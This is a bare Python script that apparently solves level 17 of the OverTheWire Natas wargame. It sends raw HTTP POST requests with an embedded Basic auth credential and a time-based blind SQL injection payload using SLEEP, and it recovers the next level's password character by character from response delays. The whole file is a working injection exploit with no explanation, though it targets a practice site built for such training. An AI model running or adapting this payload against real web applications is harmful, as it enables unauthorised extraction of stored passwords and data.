import socket, time

HOST = "natas17.natas.labs.overthewire.org"
PORT = 80
HEAD = """POST /index.php HTTP/1.1
Host: natas17.natas.labs.overthewire.org
Authorization: Basic bmF0YXMxNzo4UHMzSDBHV2JuNXJkOVM3R21BZGdRTmRraFBrcTljdw==
Content-Type: application/x-www-form-urlencoded
Content-Length: {clength}\r\n\r\n"""
POST = 'username=natas18" AND IF(BINARY LEFT(password, {glength})="{guess}",SLEEP(10),0);#'
ALPH = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"

def natas17(p):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))

    TPOST = POST.format(glength=len(p), guess=p)
    REQU = HEAD.format(clength=len(TPOST)) + TPOST
    BYTES = bytes(REQU, 'utf-8') 
    t1 = int(time.time())
    s.send(BYTES)
    r = s.recv(8192) 
    s.close()
    
    if (int(time.time()) - t1) > 7:
        return True
    return False

p = ''
for i in range(64):
    f = False
    for c in ALPH:
        print(p, c)
        if natas17(p + c):
            f = True
            p = p + c
            break
    if not f:
        break

print("DONE")
print(p)